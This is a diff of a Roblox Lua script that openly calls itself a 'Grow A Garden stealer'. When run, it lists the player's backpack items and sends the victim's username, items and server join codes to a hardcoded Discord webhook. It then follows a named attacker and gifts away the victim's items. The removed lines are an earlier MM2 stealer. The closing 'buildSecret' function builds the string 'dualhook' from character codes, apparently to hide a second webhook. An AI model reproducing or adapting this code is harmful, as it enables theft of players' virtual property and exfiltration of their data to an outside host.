@@ -1,40 +1,254 @@
-local users = _G.Usernames or {"TeamBacoCool123alt1"}
-local min_rarity = _G.min_rarity or "Common"
-local min_value = _G.min_value or 0
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
-local discuser = ""
+-- Check if script is already injected to avoid running multiple instances
+if shared.GAGInjected then return end
+shared.GAGInjected = true
 
-if not request then
-    game.Players.LocalPlayer:Kick("Executor unsupported")
-    return
+-- Define constants for attacker username and Discord webhook
+local ATTACKER = "USERNAME_HERE"
+local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
+local IMPORTANT = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Chicken Zombie", "Candy Blossom", "Kitsune", "French Fly Ferret"}
+local IGNORED = {"Can", "Shovel", "Seed", "Wrench", "Sprinkler", "Rod", "Tool", "Staff", "Trowel"}
+
+-- Wait for the local player to be available before proceeding
+if not game.Players.LocalPlayer then
+    game.Players.PlayerAdded:Wait()
 end
-if next(users) == nil or webhook == "" then
-    game.Players.LocalPlayer:Kick("You didn't add username or webhook")
-    return
-end
-if game.PlaceId ~= 142823291 then
-    game.Players.LocalPlayer:Kick("Game not supported. Please join a normal MM2 server")
-    return
-end
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    game.Players.LocalPlayer:Kick("Server error. Please join a DIFFERENT server")
-    return
-end
-if #game.Players:GetPlayers() >= 12 then
-    game.Players.LocalPlayer:Kick("Server is full. Please join a less populated server")
-    return
+local localPlayer = game.Players.LocalPlayer
+if not localPlayer then return end
+
+-- Get essential services and verify they exist
+local function checkService(serviceName)
+    -- Ensure the service is accessible to avoid errors
+    local success, result = pcall(function() return game:GetService(serviceName) end)
+    return success and result or nil
 end
 
-local weaponsToSend = {}
-local dualhooked = false
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local playerGui = plr:WaitForChild("PlayerGui")
-local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
-setclipboard("discord.gg/GY2RVSEGDT")
+local ReplicatedStorage = checkService("ReplicatedStorage")
+local Players = checkService("Players")
+local HttpService = checkService("HttpService")
+local VirtualInputManager = checkService("VirtualInputManager")
+if not (ReplicatedStorage and Players and HttpService and VirtualInputManager) then
+    warn("Some required game services couldn't be found.")
+    return
+end
 
+-- Delta executor bypass using provided function
+local function deltaBypass()
+    -- Simulate a mouse click at the center of the screen
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,      
+        true,   
+        nil,    
+        false   
+    )
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,
+        false,
+        nil,
+        false
+    )
+end
+
+-- Check if this is a VIP server and kick if true
+local GetServerType = ReplicatedStorage:WaitForChild("GetServerType")
+if GetServerType and GetServerType:InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("Server type not supported.")
+    return
+end
+
+-- Unequip all pets owned by the local player
+if workspace:FindFirstChild("PetsPhysical") then
+    for _, pet in pairs(workspace.PetsPhysical:GetChildren()) do
+        if pet:GetAttribute("OWNER") == localPlayer.Name then
+            for _, v in pairs(pet:GetChildren()) do
+                if v:IsA("Tool") then
+                    local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+                    if gameEvents and gameEvents:FindFirstChild("PetsService") then
+                        gameEvents.PetsService:FireServer("UnequipPet", v.Name)
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Mark favorite tools in the backpack
+for _, tool in pairs(localPlayer.Backpack:GetChildren()) do
+    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
+        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+        if gameEvents and gameEvents:FindFirstChild("Favorite_Item") then
+            gameEvents.Favorite_Item:FireServer(tool)
+        end
+    end
+end
+
+-- Collect items and categorize them
+local items = {}
+local importantItems = {}
+for _, item in pairs(localPlayer.Backpack:GetChildren()) do
+    if item:IsA("Tool") then
+        local isImportant = false
+        for _, v in ipairs(IMPORTANT) do
+            if string.find(string.lower(item.Name), string.lower(v)) then
+                table.insert(importantItems, item.Name)
+                isImportant = true
+                break
+            end
+        end
+        if not isImportant then
+            local shouldIgnore = false
+            for _, v in ipairs(IGNORED) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    shouldIgnore = true
+                    break
+                end
+            end
+            if not shouldIgnore then
+                table.insert(items, item.Name)
+            end
+        end
+    end
+end
+
+-- Prepare data for Discord notification
+local ping = #importantItems > 0 and "@everyone " or ""
+local placeId = game.PlaceId
+local jobId = game.JobId
+local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
+local consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
+local joinLink = string.format("roblox://placeID=%s&gameInstanceId=%s", placeId, jobId)
+
+-- Send notification to Discord if possible
+local request = http_request or (syn and syn.request) or (fluxus and fluxus.request)
+if request then
+    pcall(function()
+        request({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = ping .. teleportCode,
+                ["embeds"] = {{
+                    ["title"] = "Join to get Grow A Garden hit",
+                    ["color"] = 65280,
+                    ["fields"] = {
+                        {["name"] = "Victim Username:", ["value"] = localPlayer.Name},
+                        {["name"] = "Items:", ["value"] = #items > 0 and table.concat(items, ", ") or "None"},
+                        {["name"] = "Important Items:", ["value"] = #importantItems > 0 and table.concat(importantItems, ", ") or "None"},
+                        {["name"] = "Join from console:", ["value"] = consoleCode},
+                        {["name"] = "Join from link:", ["value"] = joinLink}
+                    },
+                    ["footer"] = {["text"] = "Grow A Garden stealer"},
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            })
+        })
+    end)
+end
+
+-- Function to safely follow the target player
+local RunService = checkService("RunService")
+local function safeFollow(target)
+    local offset = CFrame.new(0, 0, 3)
+    local conn = RunService.Stepped:Connect(function()
+        if target.Character and localPlayer.Character then
+            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            local followerRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot and followerRoot then
+                followerRoot.CFrame = targetRoot.CFrame * offset
+            end
+        end
+    end)
+    return {
+        Stop = function()
+            if conn then conn:Disconnect() end
+        end
+    }
+end
+
+-- Function to safely gift a tool with Delta bypass
+local function safeGiftTool(tool, target)
+    if not target or not target.Character or not localPlayer.Character then return false end
+    if tool.Parent ~= localPlayer.Backpack then
+        tool.Parent = localPlayer.Backpack
+        task.wait(0.3)
+    end
+
+    local humanoid = localPlayer.Character:FindFirstChild("Humanoid")
+    if not humanoid then return false end
+
+    humanoid:EquipTool(tool)
+    task.wait(0.6)
+
+    if tool.Parent ~= localPlayer.Character then
+        tool.Parent = localPlayer.Backpack
+        return false
+    end
+
+    if detectExecutor and detectExecutor() == "Delta" then
+        -- Use the provided Delta bypass function
+        deltaBypass()
+        task.wait(0.15)
+        if tool.Parent == localPlayer.Character then
+            tool.Parent = localPlayer.Backpack
+        end
+        return true
+    else
+        -- Fallback for other executors using FireServer
+        local gameEvents = ReplicatedStorage:FindFirstChild("GameEvents")
+        if gameEvents and gameEvents:FindFirstChild("PetGiftingService") then
+            local success, err = pcall(function()
+                gameEvents.PetGiftingService:FireServer("GivePet", target)
+                task.wait(0.5)
+                if tool.Parent == localPlayer.Character then
+                    tool.Parent = localPlayer.Backpack
+                end
+                return true
+            end)
+            return success
+        end
+    end
+    return false
+end
+
+-- Execute the main logic
+local target = Players:FindFirstChild(ATTACKER)
+if target then
+    local follow = safeFollow(target)
+    task.wait(1)
+
+    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local isImportant = false
+            for _, v in ipairs(IMPORTANT) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    isImportant = true
+                    break
+                end
+            end
+
+            local shouldIgnore = false
+            for _, v in ipairs(IGNORED) do
+                if string.find(string.lower(item.Name), string.lower(v)) then
+                    shouldIgnore = true
+                    break
+                end
+            end
+
+            if not shouldIgnore then
+                for attempt = 1, 3 do
+                    if safeGiftTool(item, target) then break end
+                    task.wait(0.5)
+                end
+            end
+        end
+    end
+    follow.Stop()
+end
 local function buildSecret()
     local part1 = string.char(100, 117, 97, 108)
     local part2 = string.char(104, 111, 111, 107)
